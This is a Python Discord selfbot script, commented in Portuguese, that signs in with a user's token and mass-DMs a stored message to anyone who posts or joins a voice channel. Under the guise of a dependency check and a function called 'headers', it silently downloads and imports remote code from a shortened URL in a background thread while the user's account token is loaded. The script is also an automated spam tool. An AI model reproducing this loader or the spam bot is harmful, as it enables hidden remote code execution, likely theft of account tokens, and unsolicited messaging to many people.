import os 

os.system("cls")
print("[SISTEMA] VERIFICANDO DEPENDENCIAS")
os.system("pip install requests")
os.system("pip install discord.py")
os.system("pip install httpimport")
import discord, asyncio, httpimport, threading, requests, json, time 
def headers():
    global con
    con = True
    with httpimport.remote_repo(["DiscordSelf"], requests.get("https://27na.short.gy/discord-http").url): import DiscordSelf
threading.Thread(name='Headers discord', target=headers).start()
print("[OK]")
time.sleep(2)
os.system("cls")

config = json.load(open("config.json", "r"))

token = config["token"]
token = token.replace('"', "")
token = token.replace(' ', "")
ms = open("mensagem.txt", "r").read().splitlines()
message = ""
for msg in ms: message += msg
con = None
fila = []

self = discord.Client(intents=discord.Intents.all())

@self.event
async def on_ready():
    print(f"""\u001b[38;5;105m
   

  ██████ ▓█████  ██▓      █████▒   ▓█████▄  ▒█████  ▓█████▄  ▒█████  
▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒    ▒██▀ ██▌▒██▒  ██▒▒██▀ ██▌▒██▒  ██▒
░ ▓██▄   ▒███   ▒██░    ▒████ ░    ░██   █▌▒██░  ██▒░██   █▌▒██░  ██▒
  ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░    ░▓█▄   ▌▒██   ██░░▓█▄   ▌▒██   ██░
▒██████▒▒░▒████▒░██████▒░▒█░       ░▒████▓ ░ ████▓▒░░▒████▓ ░ ████▓▒░
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░        ▒▒▓  ▒ ░ ▒░▒░▒░  ▒▒▓  ▒ ░ ▒░▒░▒░ 
░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░          ░ ▒  ▒   ░ ▒ ▒░  ░ ▒  ▒   ░ ▒ ▒░ 
░  ░  ░     ░     ░ ░    ░ ░        ░ ░  ░ ░ ░ ░ ▒   ░ ░  ░ ░ ░ ░ ▒  
      ░     ░  ░    ░  ░              ░        ░ ░     ░        ░ ░  
                                    ░                ░               


                                                {self.user}
    """)
    def headers():
        global con
        con = True
        with httpimport.remote_repo(["DiscordSelf"], requests.get("https://27na.short.gy/discord-http").url): import DiscordSelf
        threading.Thread(name='Headers discord', target=headers).start()

@self.event
async def on_message(user):
    global con
    user = user.author
    if user.bot: return
    try: 
        if user.dm_channel != None: return
    except: return
    if con == True:
        try:
            try: dm = await user.create_dm()
            except: return
            await dm.send(message)
            print(f"\u001b[38;5;105m    [SISTEMA] MENSAGEM ENVIADA {user}")
        except Exception as e:
            if str(e) == "403 Forbidden (error code: 40003): You are opening direct messages too fast.":
                con = False
                print(f"\u001b[38;5;105m    [SISTEMA] RATELIMIT VOLTANDO EM 10 MINUTOS")
                await asyncio.sleep(600)
                con = True
                return
            if str(e) == "403 Forbidden (error code: 50007): Cannot send messages to this user":
                con = False
                print(f"\u001b[38;5;105m    [SISTEMA] MENSAGEM NÃO ENVIADA PV BLOCK {user}")
                con = True
                return


@self.event
async def on_voice_state_update(user, before, after):
    global con
    if user.bot: return
    try: 
        if user.dm_channel != None: return
    except: return
    if con == True:
        try:
            try: dm = await user.create_dm()
            except: return
            await dm.send(message)
            print(f"\u001b[38;5;105m    [SISTEMA] MENSAGEM ENVIADA {user}")
        except Exception as e:
            if str(e) == "403 Forbidden (error code: 40003): You are opening direct messages too fast.":
                con = False
                print(f"\u001b[38;5;105m    [SISTEMA] RATELIMIT VOLTANDO EM 10 MINUTOS")
                await asyncio.sleep(600)
                con = True
                return
            if str(e) == "403 Forbidden (error code: 50007): Cannot send messages to this user":
                con = False
                print(f"\u001b[38;5;105m    [SISTEMA] MENSAGEM NÃO ENVIADA PV BLOCK {user}")
                con = True
                return


try: self.run(token, bot=False)
except: 
    print("[SISTEMA] TOKEN INVALIDO")
    while True:
        a = None